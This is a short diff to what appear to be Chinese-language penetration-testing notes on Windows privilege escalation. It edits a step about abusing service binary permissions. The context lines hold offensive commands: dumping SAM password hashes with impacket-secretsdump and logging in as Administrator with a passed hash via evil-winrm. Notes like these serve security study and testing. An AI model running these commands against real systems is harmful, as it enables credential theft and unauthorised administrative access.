@@ -436,8 +436,8 @@ kali: impacket-secretsdump -sam sam -system system local
 kali: evil-winrm -i ip -u Adminstrator -H hash # :后半部分
 ```
 
-5. 服务提权，首先使用`sc qc mysql`，这种的方式查询某个服务的详细配置信息，接下来根据`BINARY_PATH_NAME`查询用于查看和修改文件/文件夹NTFS权限的命令，查询命令
-```bash
+5. 服务提权，首先使用`sc qc mysql`，这种的方式查询某个服务的详细配置信息，接下来根据`BINARY_PATH_NAME`查询用于查看和修改文件/文件夹NTFS权限的命令
+```cmd
 iscacls E:\mysql\bin\mysql.exe
 # 权限级别
 # F - 完全控制
